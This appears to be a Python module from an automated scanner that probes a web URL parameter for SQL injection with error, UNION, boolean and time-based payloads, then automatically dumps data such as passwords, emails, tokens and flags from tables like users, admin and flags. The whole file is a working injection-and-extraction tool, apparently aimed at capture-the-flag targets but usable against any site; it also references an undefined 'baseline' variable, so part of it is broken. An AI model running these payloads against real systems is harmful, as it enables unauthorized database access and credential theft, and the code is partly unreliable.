"""
Aggressive SQLMap-style SQL Injection Verifier

Fast, response-driven testing with automatic data extraction.
Inspired by SQLMap's approach:
1. Error-based (fastest - 2 seconds)
2. UNION-based with column counting (5-10 seconds)
3. Boolean-based with quick confirmation (10 seconds)
4. Time-based only if nothing else works (60+ seconds)
"""

import re
import asyncio
import logging
from typing import Dict, List, Optional, Tuple
from playwright.async_api import async_playwright, Page

from ..models import SQLiVerificationResult, SQLiType, DatabaseType


class AggressiveSQLiVerifier:
    """Fast, aggressive SQLi detection with automatic exploitation"""

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.discovered_database = None
        self.discovered_columns = None

    async def verify_aggressive(
        self,
        target_url: str,
        parameter: str,
        parameter_location: str = "query"
    ) -> Dict[str, any]:
        """
        Aggressive verification with automatic exploitation

        Returns:
            {
                'vulnerable': bool,
                'type': str,  # error/union/boolean/time
                'confidence': int,
                'database': str,
                'extracted_data': dict,  # Actual extracted data!
                'exploit_url': str
            }
        """

        self.logger.info(f"[AGGRESSIVE] Starting fast SQLMap-style testing on {parameter}")

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            try:
                # Phase 1: ERROR-BASED (fastest - 2 seconds)
                self.logger.info("[AGGRESSIVE] Phase 1/4: Error-based detection (2s)")
                error_result = await self._test_error_based(page, target_url, parameter, parameter_location)
                if error_result['vulnerable']:
                    self.logger.info("[✓✓✓] ERROR-BASED SQLi found!")
                    # Don't return yet - continue to UNION for data extraction
                    self.logger.info("[AGGRESSIVE] Continuing to UNION-based for data extraction...")

                # Phase 2: UNION-BASED (fast - 10 seconds)
                # Always test UNION even if error-based found, because UNION extracts actual data
                self.logger.info("[AGGRESSIVE] Phase 2/4: UNION-based detection (10s)")
                union_result = await self._test_union_fast(page, target_url, parameter, parameter_location)
                if union_result['vulnerable']:
                    self.logger.info("[✓✓✓] UNION-BASED SQLi found!")
                    # EXTRACT DATA IMMEDIATELY
                    # Pass baseline for comparison
                    union_result['baseline'] = baseline
                    extracted = await self._extract_data_union(page, target_url, parameter, union_result, parameter_location)
                    union_result['extracted_data'] = extracted
                    return union_result

                # If error-based was found but UNION failed, return error-based result
                if error_result['vulnerable']:
                    self.logger.info("[AGGRESSIVE] UNION extraction failed, returning error-based result")
                    return error_result

                # Phase 3: BOOLEAN-BASED (medium - 15 seconds)
                self.logger.info("[AGGRESSIVE] Phase 3/4: Boolean-based detection (15s)")
                boolean_result = await self._test_boolean_fast(page, target_url, parameter, parameter_location)
                if boolean_result['vulnerable']:
                    self.logger.info("[✓✓] BOOLEAN-BASED SQLi found!")
                    return boolean_result

                # Phase 4: TIME-BASED (slowest - only if needed)
                self.logger.info("[AGGRESSIVE] Phase 4/4: Time-based detection (60s)")
                time_result = await self._test_time_based(page, target_url, parameter, parameter_location)
                if time_result['vulnerable']:
                    self.logger.info("[✓] TIME-BASED SQLi found!")
                    return time_result

                # Not vulnerable
                return {
                    'vulnerable': False,
                    'confidence': 0,
                    'message': 'No SQLi detected with aggressive testing'
                }

            finally:
                await browser.close()

    async def _test_error_based(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Test error-based SQLi (fastest method)

        Strategy:
        1. Inject syntax errors and look for database error messages
        2. Extract database type, version from errors
        3. Use cast/convert errors to leak data
        """

        # Error-inducing payloads
        error_payloads = [
            "'",  # Syntax error
            "\"",  # Double quote syntax error
            "`",  # Backtick (MySQL)
            "'))",  # Close brackets
            "' AND 1=CAST((SELECT CONCAT('___',database(),'___')) AS INT)--",  # MySQL data leak
            "' AND 1=CAST((SELECT version()) AS INT)--",  # PostgreSQL version leak
            "' AND CONVERT(INT,(SELECT @@version))>0--",  # MSSQL version leak
        ]

        for payload in error_payloads:
            response = await self._fetch(page, target_url, parameter, payload, location)

            # Check for database error messages
            errors = self._extract_error_info(response)
            if errors['has_error']:
                self.logger.info(f"[ERROR-BASED] Found: {errors['database']} - {errors['message'][:60]}")

                # Try to extract data via error
                extracted_data = errors.get('leaked_data', {})

                return {
                    'vulnerable': True,
                    'type': 'error_based',
                    'confidence': 90,
                    'database': errors['database'],
                    'payload': payload,
                    'exploit_url': self._build_url(target_url, parameter, payload),
                    'extracted_data': extracted_data,
                    'error_message': errors['message']
                }

        return {'vulnerable': False}

    async def _test_union_fast(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Fast UNION-based detection with immediate data extraction

        Strategy:
        1. Try common column counts first (1-5)
        2. Detect success by looking for marker string
        3. Extract database info immediately
        """

        # Get baseline response
        baseline = await self._fetch(page, target_url, parameter, "test", location)
        baseline_text = self._extract_text(baseline)

        # Try different prefixes and column counts
        prefixes = ["'", "%'", "' ", "%' ", "1'"]

        for prefix in prefixes:
            # Try 1-10 columns (most common)
            for cols in range(1, 11):
                # Use marker string to detect success
                marker = "___SQLI_MARKER___"

                # Build column list properly (no trailing comma for single column)
                if cols == 1:
                    columns = f"'{marker}'"
                else:
                    nulls = ['NULL'] * (cols - 1)
                    columns = f"'{marker}',{','.join(nulls)}"

                payload = f"{prefix} UNION SELECT {columns}--"

                self.logger.debug(f"[UNION] Testing: {payload[:80]}...")
                response = await self._fetch(page, target_url, parameter, payload, location)
                response_text = self._extract_text(response)

                # Success: marker appears in response
                if marker in response_text:
                    self.logger.info(f"[UNION] ✓ Found {cols} columns with prefix '{prefix}'")

                    return {
                        'vulnerable': True,
                        'type': 'union_based',
                        'confidence': 95,
                        'database': 'unknown',
                        'payload': payload,
                        'exploit_url': self._build_url(target_url, parameter, payload),
                        'columns': cols,
                        'prefix': prefix,
                        'marker_found': True
                    }

                # Also check for no SQL error = potential success
                if not self._has_sql_error(response):
                    # Might be successful, verify with actual data
                    if cols == 1:
                        test_columns = "version()"
                    else:
                        nulls_test = ['NULL'] * (cols - 1)
                        test_columns = f"version(),{','.join(nulls_test)}"

                    test_payload = f"{prefix} UNION SELECT {test_columns}--"
                    self.logger.debug(f"[UNION] Verifying with version: {test_payload[:80]}...")
                    test_response = await self._fetch(page, target_url, parameter, test_payload, location)
                    test_text = self._extract_text(test_response)

                    # Look for version string
                    if re.search(r'(PostgreSQL|MySQL|MariaDB|Microsoft SQL)', test_text, re.I):
                        self.logger.info(f"[UNION] ✓ Found {cols} columns (version detected)")

                        return {
                            'vulnerable': True,
                            'type': 'union_based',
                            'confidence': 90,
                            'database': 'detected_from_version',
                            'payload': test_payload,
                            'exploit_url': self._build_url(target_url, parameter, test_payload),
                            'columns': cols,
                            'prefix': prefix
                        }

                    # Also try just checking if response changed significantly
                    if len(response_text) > 0 and abs(len(response_text) - len(baseline_text)) < 100:
                        # Response similar length, no error - likely successful UNION
                        self.logger.info(f"[UNION] ✓ Found {cols} columns (no error, stable response)")

                        return {
                            'vulnerable': True,
                            'type': 'union_based',
                            'confidence': 75,
                            'database': 'unknown',
                            'payload': payload,
                            'exploit_url': self._build_url(target_url, parameter, payload),
                            'columns': cols,
                            'prefix': prefix
                        }

        return {'vulnerable': False}

    async def _extract_data_union(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        union_result: Dict,
        location: str
    ) -> Dict:
        """
        Extract actual data using UNION injection

        This is what SQLMap does after finding UNION!
        """

        cols = union_result['columns']
        prefix = union_result['prefix']
        baseline_html = union_result.get('baseline', '')

        # Helper to build column list properly
        def build_columns(expr):
            if cols == 1:
                return expr
            else:
                nulls = ['NULL'] * (cols - 1)
                return f"{expr},{','.join(nulls)}"

        # Helper to extract ONLY new data (not in baseline)
        def extract_new_data(response_html):
            """Extract only data that wasn't in the baseline response"""
            import re

            # Extract all <p> tag content
            baseline_paragraphs = set(re.findall(r'<p>([^<]+)</p>', baseline_html))
            response_paragraphs = re.findall(r'<p>([^<]+)</p>', response_html)

            # Find NEW paragraphs (injected data)
            new_data = []
            for p in response_paragraphs:
                p_clean = p.strip()
                if (p_clean not in baseline_paragraphs and
                    len(p_clean) > 3 and
                    p_clean.lower() not in ['lorem ipsum dolor sit amet, consectetur adipiscing elit.',
                                            'fusce ut pellentesque urna.',
                                            'praesent scelerisque nunc.']):
                    new_data.append(p_clean)

            return new_data

        extracted = {}

        # 1. Extract database version
        self.logger.info("[EXTRACT] Getting database version...")
        version_payloads = [
            f"{prefix} UNION SELECT {build_columns('version()')}--",  # PostgreSQL/MySQL
            f"{prefix} UNION SELECT {build_columns('@@version')}--",  # MySQL/MSSQL
        ]

        for vp in version_payloads:
            response = await self._fetch(page, target_url, parameter, vp, location)
            text = self._extract_text(response)
            version_match = re.search(r'(PostgreSQL|MySQL|MariaDB|Microsoft SQL)[\s\d\.]+', text, re.I)
            if version_match:
                extracted['version'] = version_match.group(0)
                self.logger.info(f"[EXTRACT] ✓ Version: {extracted['version']}")
                break

        # 2. Extract current database
        self.logger.info("[EXTRACT] Getting current database...")
        db_payloads = [
            f"{prefix} UNION SELECT {build_columns('database()')}--",  # MySQL
            f"{prefix} UNION SELECT {build_columns('current_database()')}--",  # PostgreSQL
            f"{prefix} UNION SELECT {build_columns('DB_NAME()')}--",  # MSSQL
        ]

        for dp in db_payloads:
            response = await self._fetch(page, target_url, parameter, dp, location)
            text = self._extract_text(response)
            # Look for database name (alphanumeric, not NULL)
            db_match = re.search(r'([a-z][a-z0-9_]{2,20})', text, re.I)
            if db_match and db_match.group(1).lower() not in ['null', 'test', 'lorem']:
                extracted['current_database'] = db_match.group(1)
                self.logger.info(f"[EXTRACT] ✓ Database: {extracted['current_database']}")
                break

        # 3. Direct data extraction from common CTF tables
        # Skip table enumeration (unreliable) and directly try common tables
        self.logger.info("[EXTRACT] Attempting direct data extraction from common tables...")

        # Try common CTF/challenge tables with common columns
        table_column_attempts = [
            ('flag', ['token', 'flag', 'value', 'data', 'secret', 'key']),
            ('flags', ['token', 'flag', 'value', 'data', 'secret', 'key']),
            ('users', ['username', 'password', 'email', 'name', 'id']),
            ('admin', ['username', 'password', 'email', 'name', 'id']),
            ('secrets', ['value', 'data', 'secret', 'token']),
        ]

        for table, columns in table_column_attempts:
            self.logger.info(f"[EXTRACT] Trying table '{table}'...")

            for col in columns:
                data_payload = f"{prefix} UNION SELECT {build_columns(col)} FROM {table}--"
                response = await self._fetch(page, target_url, parameter, data_payload, location)

                # Check if we got actual data (not SQL error)
                if not self._has_sql_error(response):
                    # Extract ONLY new data using baseline comparison
                    new_data = extract_new_data(response)

                    if new_data:
                        extracted[f'{table}_{col}'] = '\n'.join(new_data[:10])  # First 10 lines
                        self.logger.info(f"[EXTRACT] ✓✓✓ DATA FROM {table}.{col}:")
                        for line in new_data[:5]:
                            self.logger.info(f"    → {line}")

                        # If this is the flag table, we found what we're looking for!
                        if table in ['flag', 'flags']:
                            self.logger.info(f"[EXTRACT] ✓✓✓ FLAG FOUND!")
                            break

            # Stop after finding flag
            if any(k.startswith(('flag_', 'flags_')) for k in extracted.keys()):
                break

        return extracted

    async def _test_boolean_fast(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Fast boolean-based detection (2 tests only)
        """

        # Get baseline
        baseline = await self._fetch(page, target_url, parameter, "test", location)
        baseline_len = len(baseline)

        # Test TRUE vs FALSE
        true_payload = "' OR '1'='1"
        false_payload = "' AND '1'='2"

        true_response = await self._fetch(page, target_url, parameter, true_payload, location)
        false_response = await self._fetch(page, target_url, parameter, false_payload, location)

        true_len = len(true_response)
        false_len = len(false_response)

        # Check if TRUE returns more data than FALSE
        if true_len > false_len and true_len > baseline_len:
            diff = true_len - false_len
            if diff > (baseline_len * 0.1):  # 10% difference
                return {
                    'vulnerable': True,
                    'type': 'boolean_blind',
                    'confidence': 75,
                    'database': 'unknown',
                    'payload': true_payload,
                    'exploit_url': self._build_url(target_url, parameter, true_payload),
                    'true_len': true_len,
                    'false_len': false_len,
                    'diff': diff
                }

        return {'vulnerable': False}

    async def _test_time_based(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """Time-based detection (slow - only if nothing else works)"""

        import time

        # Measure baseline
        start = time.time()
        await self._fetch(page, target_url, parameter, "test", location)
        baseline_time = time.time() - start

        # Test with 3-second delay
        payloads = [
            "' AND SLEEP(3)--",  # MySQL
            "' AND pg_sleep(3)--",  # PostgreSQL
        ]

        for payload in payloads:
            start = time.time()
            await self._fetch(page, target_url, parameter, payload, location)
            test_time = time.time() - start

            delay = test_time - baseline_time

            if 2.5 <= delay <= 3.5:  # Within 0.5s of expected delay
                return {
                    'vulnerable': True,
                    'type': 'time_blind',
                    'confidence': 85,
                    'database': 'mysql' if 'SLEEP' in payload else 'postgresql',
                    'payload': payload,
                    'exploit_url': self._build_url(target_url, parameter, payload),
                    'delay': delay
                }

        return {'vulnerable': False}

    async def _fetch(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        payload: str,
        location: str
    ) -> str:
        """Fetch response with payload injected"""

        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        try:
            if location == "query":
                # Inject into URL
                parsed = urlparse(target_url)
                params = parse_qs(parsed.query) if parsed.query else {}
                params[parameter] = [payload]

                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))

                try:
                    await page.goto(test_url, wait_until='load', timeout=5000)
                except:
                    try:
                        await page.goto(test_url, wait_until='domcontentloaded', timeout=3000)
                    except:
                        pass  # Continue anyway

                return await page.content()

            # POST not implemented yet
            return ""

        except Exception as e:
            self.logger.warning(f"Fetch error: {str(e)[:60]}")
            return ""

    def _extract_error_info(self, html: str) -> Dict:
        """Extract database error information from response"""

        error_patterns = {
            'mysql': [
                r'You have an error in your SQL syntax',
                r'mysql_fetch',
                r'MySQL server version',
                r'supplied argument is not a valid MySQL'
            ],
            'postgresql': [
                r'PostgreSQL.*ERROR',
                r'pg_query\(\)',
                r'pg_exec\(\)',
                r'PSQLException'
            ],
            'mssql': [
                r'Microsoft SQL Server',
                r'ODBC SQL Server Driver',
                r'SQLServer JDBC Driver'
            ],
            'oracle': [
                r'ORA-\d{5}',
                r'Oracle error',
                r'Oracle.*Driver'
            ]
        }

        html_lower = html.lower()

        for db_type, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, html, re.I):
                    # Extract error message
                    error_match = re.search(r'(error|exception|warning)[:\s]+(.{0,200})', html, re.I)
                    message = error_match.group(2) if error_match else pattern

                    # Look for leaked data (in error messages)
                    leaked = {}
                    version_match = re.search(r'version[:\s]+([^\s<]+)', html, re.I)
                    if version_match:
                        leaked['version'] = version_match.group(1)

                    return {
                        'has_error': True,
                        'database': db_type,
                        'message': message,
                        'leaked_data': leaked
                    }

        return {'has_error': False}

    def _has_sql_error(self, html: str) -> bool:
        """Check if response contains SQL error"""
        return self._extract_error_info(html)['has_error']

    def _extract_text(self, html: str) -> str:
        """Extract visible text from HTML"""
        # Remove HTML tags
        text = re.sub(r'<[^>]+>', ' ', html)
        # Remove extra whitespace
        text = re.sub(r'\s+', ' ', text)
        return text.strip()

    def _build_url(self, target_url: str, parameter: str, payload: str) -> str:
        """Build exploit URL"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

        parsed = urlparse(target_url)
        params = parse_qs(parsed.query) if parsed.query else {}
        params[parameter] = [payload]

        new_query = urlencode(params, doseq=True, quote_via=quote)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
